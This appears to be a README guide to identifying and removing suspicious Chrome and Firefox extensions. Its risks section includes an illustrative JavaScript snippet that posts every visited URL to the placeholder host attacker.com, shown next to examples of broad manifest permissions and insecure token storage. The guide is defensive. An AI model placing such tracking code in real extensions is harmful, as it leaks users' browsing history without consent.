# Spotting-and-Removing-Suspicious-Extensions

o identify and remove suspicious browser extensions, follow a clear, step-by-step process using your web browser’s built-in tools. Suspicious extensions often have vague names, require excessive permissions, have poor reviews, or are no longer used. Removing them can improve both your browser’s security and overall performance

| Extension Name               | Reason for Concern/Removal    | Action Taken |
| ---------------------------- | ----------------------------- | ------------ |
| Deal Finder                  | Unfamiliar, excessive rights  | Removed      |
| PDF Converter Pro            | Poor reviews, invasive access | Removed      |
| Weather Now                  | Unused, installed long ago    | Removed      |
| (Write your own examples...) |                               |              |

Here’s your concise README.md, formatted for inclusion in a GitHub repository. This structure introduces the project, explains its purpose, and provides clear step-by-step usage instructions suitable for both technical and non-technical audiences.

***

# Spot and Remove Suspicious Browser Extensions

A simple guide to help users identify and remove potentially harmful or unnecessary browser extensions in Chrome and Firefox.

## Why?

Malicious or poorly managed browser extensions can:

- Steal sensitive information
- Hijack browsing sessions
- Inject ads, cause unwanted redirects, or slow down your browser

## How to Use

Follow these steps regularly to keep your browser secure:

### 1. Open the Extension Manager

- **Chrome:**  
  Menu (⋮) → More Tools → Extensions
- **Firefox:**  
  Menu (☰) → Add-ons and Themes → Extensions

### 2. Review Extensions

- Scroll through your installed extensions.
- Look for unfamiliar names or tools you didn’t intentionally add.

### 3. Check Permissions & Reviews

- Inspect permissions for each extension.
- Be wary of extensions that request broad access or “all site data.”
- Search online or on the extension store for user reviews and ratings.

### 4. Remove Suspicious or Unused Extensions

- **Chrome:** Click “Remove” on unwanted extensions.
- **Firefox:** Use the three-dot menu next to the extension and select “Remove.”

### 5. Restart Your Browser

- Restart to complete the process and stop any rogue processes.

### 6. Observe Improvements

- Check for faster performance and fewer ads/pop-ups after cleaning.



Malicious or poorly secured browser extensions pose several significant risks. Below are key ways they can affect users, with real-world and code-based examples:

#### 1. Stealing Sensitive Information
Browser extensions with broad permissions can access data on every website you visit, including credentials, cookies, session tokens, and payment details. This risk is heightened when extensions require “tabs” and “<all_urls>” permissions.

- **Example: Manifest with Broad Permissions**
  ```json
  {
    "permissions": [
      "tabs",
      "http://*/*",
      "https://*/*",
      "storage"
    ]
  }
  ```
  Such permissions could allow a compromised extension to collect sensitive information across all browsing sessions.

#### 2. Hijacking Sessions and Impersonating Users
If an extension can access your cookies or authentication tokens, it can impersonate you on other sites. Server-Side Request Forgery (SSRF) vulnerabilities have been observed where extensions send authenticated requests to attacker-chosen domains, resulting in credential theft.

#### 3. Installing Malware or Causing Redirects/Ads
Some malicious extensions inject unwanted advertisements into webpages or silently redirect users to phishing sites. They may fetch and execute third-party scripts or payloads, further expanding the attack surface.

- **Example: Data Leakage Code**
  ```javascript
  chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete') {
      fetch('http://attacker.com/track', {
        method: 'POST',
        body: JSON.stringify({ url: tab.url })
      });
    }
  });
  ```
  This snippet sends every page you visit to a remote attacker.

#### 4. Slowing Down Performance
Extensions running heavy background scripts or injecting ads can degrade browser and system performance.

#### 5. Insecure Storage and Privacy Risks
Extensions that store sensitive tokens or credentials in unencrypted local storage are vulnerable to theft if any malware or another extension gains access:

**Insecure Storage Example**
  ```javascript
  // Bad practice: storing unencrypted tokens
  localStorage.setItem('token', 'my-secret-token');
  ```

#### 6. Lack of Privacy Controls
Many extensions have no privacy policy or provide unclear data collection details, which allows unlimited data abuse.

